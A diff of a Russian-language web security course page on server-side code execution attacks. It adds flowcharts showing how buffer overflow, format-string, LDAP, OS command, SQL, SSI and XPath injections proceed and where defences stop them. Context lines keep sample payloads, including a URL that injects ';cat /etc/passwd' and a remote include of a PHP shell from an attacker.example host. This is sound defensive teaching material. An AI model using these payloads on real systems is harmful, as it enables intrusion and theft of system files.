@@ -21,13 +21,51 @@ SSTI (Server-Side Template Injection) возникает при подстано
 
 ***
 
+## Как читать схемы на странице
+
+У каждого класса атак есть схема хода атаки. Она читается сверху вниз: с чего начинает нарушитель, какое место приложения он использует и к чему это приводит. Ромб — место, где атаку останавливает защита: ветка «Да» показывает, что происходит при работающей защите, ветка «Нет» — итог при её отсутствии. Схемы описывают ход атаки без полезных нагрузок: примеры и меры защиты разобраны в тексте разделов. Обозначения фигур — в справочнике [Схемы курса](../diagrams_legend.md).
+
 ## Содержание документа
 
 Эта секция описывает атаки, направленные на выполнение кода на Web-сервере. Все серверы используют данные, переданные пользователем при обработке запросов. Часто эти данные используются при составлении команд, применяемых для генерации динамического содержимого. Если при разработке не учитываются требования безопасности, злоумышленник получает возможность модифицировать исполняемые команды.
 
 ### Переполнение буфера (Buffer Overflow)
 
-Эксплуатация переполнения буфера позволяет злоумышленнику изменить путь исполнения программы путем перезаписи данных в памяти системы. Переполнение буфера является наиболее распространенной причиной ошибок в программах. Оно возникает, когда объем данных превышает размер выделенного под них буфера. Когда буфер переполняется, данные переписывают другие области памяти, что приводит к возникновению ошибки. Если злоумышленник имеет возможность управлять процессом переполнения, это может вызвать ряд серьезных проблем.
+Эксплуатация переполнения буфера позволяет злоумышленнику изменить путь исполнения программы путем перезаписи данных в памяти системы. Переполнение буфера является наиболее распространенной причиной ошибок в программах. Оно возникает, когда объём данных превышает размер выделенного под них буфера. Когда буфер переполняется, данные переписывают другие области памяти, что приводит к возникновению ошибки. Если злоумышленник имеет возможность управлять процессом переполнения, это может вызвать ряд серьезных проблем.
+
+Как происходит атака и где её останавливает защита:
+
+```mermaid
+%%{init: {"flowchart": {"curve": "step"}}}%%
+flowchart TB
+    accTitle: Ход атаки: переполнение буфера
+    accDescr: Нарушитель: ввод длиннее ожидаемого. Затем: программа копирует ввод в буфер без проверки длины. Если защита на месте (длина проверяется, включены защиты памяти), ввод отброшен или процесс завершён. Если защиты нет, соседняя память перезаписана; итог: сбой или выполнение чужого кода.
+
+    start_actor(["Нарушитель: ввод<br/>длиннее ожидаемого"])
+    step_one["Программа копирует<br/>ввод в буфер без<br/>проверки длины"]
+    control_gate{"Длина проверяется,<br/>включены защиты<br/>памяти?"}
+    control_fork((" "))
+    attack_stopped(["Ввод отброшен или<br/>процесс завершён"])
+    impact_step["Соседняя память<br/>перезаписана"]
+    attack_result(["Итог: сбой или<br/>выполнение чужого кода"])
+
+    start_actor --> step_one
+    step_one --> control_gate
+    control_gate --- control_fork
+    control_fork -->|Да| attack_stopped
+    control_fork -->|Нет| impact_step
+    impact_step --> attack_result
+
+    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
+    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
+    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
+    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d
+
+    class control_fork junction
+    class step_one,impact_step stage
+    class control_gate gate
+    class start_actor,attack_stopped,attack_result done
+```
 
 Переполнение буфера может вызывать отказы в обслуживании, приводя к повреждению памяти и вызывая ошибки в программах. Более серьезные ситуации позволяют изменить путь исполнения программы и выполнить в её контексте различные действия.
 
@@ -47,7 +85,41 @@ SSTI (Server-Side Template Injection) возникает при подстано
 
 При использовании этих атак путь исполнения программы модифицируется методом перезаписи областей памяти с помощью функций форматирования символьных переменных. Уязвимость возникает, когда пользовательские данные применяются в качестве аргументов функций форматирования строк, таких как `fprintf`, `printf`, `sprintf`, `setproctitle`, `syslog` и т.д.
 
-Если атакующий передает приложению строку, содержащую символы форматирования (`%f`, `%p`, `%n` и т.д.), то у него появляется возможность:
+Как происходит атака и где её останавливает защита:
+
+```mermaid
+%%{init: {"flowchart": {"curve": "step"}}}%%
+flowchart TB
+    accTitle: Ход атаки: атака на функции форматирования строк
+    accDescr: Нарушитель: ввод со спецификаторами формата. Затем: ввод передан функции как строка формата. Если защита на месте (формат задан константой, ввод идёт аргументом), ввод выведен как текст. Если защиты нет, функция читает и пишет память; итог: утечка памяти, выполнение кода.
+
+    start_actor(["Нарушитель: ввод со<br/>спецификаторами<br/>формата"])
+    step_one["Ввод передан функции<br/>как строка формата"]
+    control_gate{"Формат задан<br/>константой, ввод идёт<br/>аргументом?"}
+    control_fork((" "))
+    attack_stopped(["Ввод выведен как текст"])
+    impact_step["Функция читает и пишет<br/>память"]
+    attack_result(["Итог: утечка памяти,<br/>выполнение кода"])
+
+    start_actor --> step_one
+    step_one --> control_gate
+    control_gate --- control_fork
+    control_fork -->|Да| attack_stopped
+    control_fork -->|Нет| impact_step
+    impact_step --> attack_result
+
+    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
+    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
+    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
+    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d
+
+    class control_fork junction
+    class step_one,impact_step stage
+    class control_gate gate
+    class start_actor,attack_stopped,attack_result done
+```
+
+Если атакующий передаёт приложению строку, содержащую символы форматирования (`%f`, `%p`, `%n` и т.д.), то у него появляется возможность:
 
 - выполнить произвольный код на сервере
 - считывать значения из стека
@@ -80,6 +152,40 @@ printf(emailAddress);
 ### Внедрение операторов LDAP (LDAP Injection)
 
 Атаки этого типа направлены на Web-серверы, создающие запросы к службе LDAP на основе данных, вводимых пользователем.
+
+Как происходит атака и где её останавливает защита:
+
+```mermaid
+%%{init: {"flowchart": {"curve": "step"}}}%%
+flowchart TB
+    accTitle: Ход атаки: внедрение операторов LDAP
+    accDescr: Нарушитель: ввод со знаками фильтра LDAP. Затем: приложение склеивает фильтр из строки и ввода. Если защита на месте (ввод экранируется, фильтр параметризован), знаки стали обычным текстом. Если защиты нет, логика фильтра изменена; итог: обход входа, чтение каталога.
+
+    start_actor(["Нарушитель: ввод со<br/>знаками фильтра LDAP"])
+    step_one["Приложение склеивает<br/>фильтр из строки и<br/>ввода"]
+    control_gate{"Ввод экранируется,<br/>фильтр параметризован?"}
+    control_fork((" "))
+    attack_stopped(["Знаки стали обычным<br/>текстом"])
+    impact_step["Логика фильтра<br/>изменена"]
+    attack_result(["Итог: обход входа,<br/>чтение каталога"])
+
+    start_actor --> step_one
+    step_one --> control_gate
+    control_gate --- control_fork
+    control_fork -->|Да| attack_stopped
+    control_fork -->|Нет| impact_step
+    impact_step --> attack_result
+
+    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
+    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
+    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
+    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d
+
+    class control_fork junction
+    class step_one,impact_step stage
+    class control_gate gate
+    class start_actor,attack_stopped,attack_result done
+```
 
 Упрощенный протокол доступа к службе каталога (Lightweight Directory Access Protocol, LDAP) -- открытый протокол для создания запросов и управления службами каталога, совместимыми со стандартом X.500. Протокол LDAP работает поверх транспортных протоколов Internet (TCP/UDP). Web-приложение может использовать данные, предоставленные пользователем для создания запросов по протоколу LDAP при генерации динамических Web-страниц.
 
@@ -148,6 +254,40 @@ http://example/ldapsearch.asp?user=*
 ### Выполнение команд ОС (OS Commanding)
 
 Атаки этого класса направлены на выполнение команд операционной системы на Web-сервере путем манипуляции входными данными. Если информация, полученная от клиента, должным образом не верифицируется, атакующий получает возможность выполнить команды ОС. Они будут выполняться с тем же уровнем привилегий, с каким работает компонент приложения, выполняющий запрос (сервер СУБД, Web-сервер и т.д).
+
+Как происходит атака и где её останавливает защита:
+
+```mermaid
+%%{init: {"flowchart": {"curve": "step"}}}%%
+flowchart TB
+    accTitle: Ход атаки: выполнение команд ОС
+    accDescr: Нарушитель: ввод с разделителем команд. Затем: приложение собирает команду оболочки строкой. Если защита на месте (вызов без оболочки, аргументы списком), ввод остался одним аргументом. Если защиты нет, оболочка выполняет вторую команду; итог: команды с правами приложения.
+
+    start_actor(["Нарушитель: ввод с<br/>разделителем команд"])
+    step_one["Приложение собирает<br/>команду оболочки<br/>строкой"]
+    control_gate{"Вызов без оболочки,<br/>аргументы списком?"}
+    control_fork((" "))
+    attack_stopped(["Ввод остался одним<br/>аргументом"])
+    impact_step["Оболочка выполняет<br/>вторую команду"]
+    attack_result(["Итог: команды с<br/>правами приложения"])
+
+    start_actor --> step_one
+    step_one --> control_gate
+    control_gate --- control_fork
+    control_fork -->|Да| attack_stopped
+    control_fork -->|Нет| impact_step
+    impact_step --> attack_result
+
+    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
+    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
+    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
+    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d
+
+    class control_fork junction
+    class step_one,impact_step stage
+    class control_gate gate
+    class start_actor,attack_stopped,attack_result done
+```
 
 **Пример:**
 
@@ -235,6 +375,40 @@ http://example/directory.php?dir=%3Bcat%20/etc/passwd
 ### Внедрение операторов SQL (SQL Injection)
 
 Эти атаки направлены на Web-серверы, создающие SQL-запросы к серверам СУБД на основе данных, вводимых пользователем.
+
+Как происходит атака и где её останавливает защита:
+
+```mermaid
+%%{init: {"flowchart": {"curve": "step"}}}%%
+flowchart TB
+    accTitle: Ход атаки: внедрение операторов SQL
+    accDescr: Нарушитель: ввод со знаками SQL. Затем: приложение склеивает запрос из строки и ввода. Если защита на месте (запрос параметризован), ввод передан как значение. Если защиты нет, структура запроса изменена; итог: чтение и изменение данных, обход входа.
+
+    start_actor(["Нарушитель: ввод со<br/>знаками SQL"])
+    step_one["Приложение склеивает<br/>запрос из строки и<br/>ввода"]
+    control_gate{"Запрос параметризован?"}
+    control_fork((" "))
+    attack_stopped(["Ввод передан как<br/>значение"])
+    impact_step["Структура запроса<br/>изменена"]
+    attack_result(["Итог: чтение и<br/>изменение данных,<br/>обход входа"])
+
+    start_actor --> step_one
+    step_one --> control_gate
+    control_gate --- control_fork
+    control_fork -->|Да| attack_stopped
+    control_fork -->|Нет| impact_step
+    impact_step --> attack_result
+
+    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
+    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
+    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
+    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d
+
+    class control_fork junction
+    class step_one,impact_step stage
+    class control_gate gate
+    class start_actor,attack_stopped,attack_result done
+```
 
 Язык запросов Structured Query Language (SQL) представляет собой специализированный язык программирования, позволяющий создавать запросы к серверам СУБД. Большинство серверов поддерживают этот язык в вариантах, стандартизированных ISO и ANSI. В большинстве современных СУБД присутствуют расширения диалекта SQL, специфичные для данной реализации (T-SQL в Microsoft SQL Server, PL/SQL в Oracle и т.д.).
 
@@ -336,9 +510,43 @@ http://example/article.asp?ID=2+and+1=0   (вернется ошибка или 
 
 Атаки данного класса позволяют злоумышленнику передать исполняемый код, который в дальнейшем будет выполнен на Web-сервере. Уязвимости, приводящие к возможности осуществления данных атак, обычно заключаются в отсутствии проверки данных, предоставленных пользователем, перед сохранением их в интерпретируемом сервером файле.
 
+Как происходит атака и где её останавливает защита:
+
+```mermaid
+%%{init: {"flowchart": {"curve": "step"}}}%%
+flowchart TB
+    accTitle: Ход атаки: внедрение серверных расширений
+    accDescr: Нарушитель: текст с директивой SSI. Затем: текст сохраняется в странице, которую обрабатывает сервер. Если защита на месте (sSI выключен или ввод кодируется), директива показана как текст. Если защиты нет, сервер исполняет директиву; итог: чтение файлов, выполнение команд.
+
+    start_actor(["Нарушитель: текст с<br/>директивой SSI"])
+    step_one["Текст сохраняется в<br/>странице, которую<br/>обрабатывает сервер"]
+    control_gate{"SSI выключен или ввод<br/>кодируется?"}
+    control_fork((" "))
+    attack_stopped(["Директива показана как<br/>текст"])
+    impact_step["Сервер исполняет<br/>директиву"]
+    attack_result(["Итог: чтение файлов,<br/>выполнение команд"])
+
+    start_actor --> step_one
+    step_one --> control_gate
+    control_gate --- control_fork
+    control_fork -->|Да| attack_stopped
+    control_fork -->|Нет| impact_step
+    impact_step --> attack_result
+
+    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
+    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
+    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
+    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d
+
+    class control_fork junction
+    class step_one,impact_step stage
+    class control_gate gate
+    class start_actor,attack_stopped,attack_result done
+```
+
 Перед генерацией HTML-страницы сервер может выполнять сценарии, например Server-Side Includes (SSI). В некоторых ситуациях исходный код страниц генерируется на основе данных, предоставленных пользователем.
 
-Если атакующий передает серверу операторы SSI, он может получить возможность выполнения команд операционной системы или включить в страницу запрещенное содержимое при следующем отображении.
+Если атакующий передаёт серверу операторы SSI, он может получить возможность выполнения команд операционной системы или включить в страницу запрещённое содержимое при следующем отображении.
 
 **Пример:**
 
@@ -386,6 +594,40 @@ http://portal.example/index.php?template=http://attacker.example/phpshell
 ### Внедрение операторов XPath (XPath Injection)
 
 Эти атаки направлены на Web-серверы, создающие запросы на языке XPath на основе данных, вводимых пользователем.
+
+Как происходит атака и где её останавливает защита:
+
+```mermaid
+%%{init: {"flowchart": {"curve": "step"}}}%%
+flowchart TB
+    accTitle: Ход атаки: внедрение операторов XPath
+    accDescr: Нарушитель: ввод со знаками XPath. Затем: приложение склеивает выражение XPath. Если защита на месте (выражение параметризовано, ввод проверяется), ввод остался значением. Если защиты нет, условие выборки изменено; итог: обход входа, чтение XML-данных.
+
+    start_actor(["Нарушитель: ввод со<br/>знаками XPath"])
+    step_one["Приложение склеивает<br/>выражение XPath"]
+    control_gate{"Выражение<br/>параметризовано, ввод<br/>проверяется?"}
+    control_fork((" "))
+    attack_stopped(["Ввод остался значением"])
+    impact_step["Условие выборки<br/>изменено"]
+    attack_result(["Итог: обход входа,<br/>чтение XML-данных"])
+
+    start_actor --> step_one
+    step_one --> control_gate
+    control_gate --- control_fork
+    control_fork -->|Да| attack_stopped
+    control_fork -->|Нет| impact_step
+    impact_step --> attack_result
+
+    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
+    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
+    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
+    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d
+
+    class control_fork junction
+    class step_one,impact_step stage
+    class control_gate gate
+    class start_actor,attack_stopped,attack_result done
+```
 
 Язык XPath 1.0 разработан для предоставления возможности обращения к частям документа на языке XML. Он может быть использован непосредственно либо в качестве составной части XSLT-преобразования XML-документов или выполнения запросов XQuery.
 
